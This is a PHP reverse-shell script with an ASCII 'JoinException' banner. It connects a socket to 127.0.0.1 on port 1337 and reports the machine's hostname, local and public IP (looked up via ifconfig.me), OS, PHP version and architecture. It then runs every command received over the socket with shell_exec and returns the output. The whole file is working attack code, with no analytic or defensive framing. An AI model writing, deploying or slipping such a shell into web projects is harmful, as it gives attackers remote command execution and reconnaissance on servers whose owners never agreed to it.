<?php
function ipv4() {
    return trim(file_get_contents("http://ifconfig.me/ip"));
}

$ascii = "
    _     _      ___                 _   _          
 _ | |___(_)_ _ | __|_ ____ ___ _ __| |_(_)___ _ _  
| || / _ \ | ' \| _|\ \ / _/ -_) '_ \  _| / _ \ ' \ 
 \__/\___/_|_||_|___/_\_\__/\___| .__/\__|_\___/_||_|
                               |_|                   ";

$sock = @fsockopen("127.0.0.1", 1337, $errno, $errstr, 30);
if (!$sock) {
    die("Unable to connect: $errstr ($errno)\n");
}

$host = gethostname();
$lip = gethostbyname($host);
$pip = ipv4();
$sys = php_uname();
$phpv = phpversion();
$arch = php_uname('m');

fwrite($sock, "Successfully connected.\n");
fwrite($sock, $ascii . "\n");
fwrite($sock, "===== SYSTEM INFORMATION =====\n");
fwrite($sock, "System: $sys\n");
fwrite($sock, "Machine: $host\n");
fwrite($sock, "Local IP: $lip\n");
fwrite($sock, "Public IP: $pip\n");
fwrite($sock, "PHP Version: $phpv\n");
fwrite($sock, "Architecture: $arch\n");
fwrite($sock, "==============================\n");
fwrite($sock, "user@r-shell> ");

while (!feof($sock)) {
    $cmd = trim(fgets($sock));
    if ($cmd === 'exit') break;
    $output = shell_exec($cmd . " 2>&1");
    fwrite($sock, $output);
    fwrite($sock, "\nuser@r-shell> ");
}

fclose($sock);
?>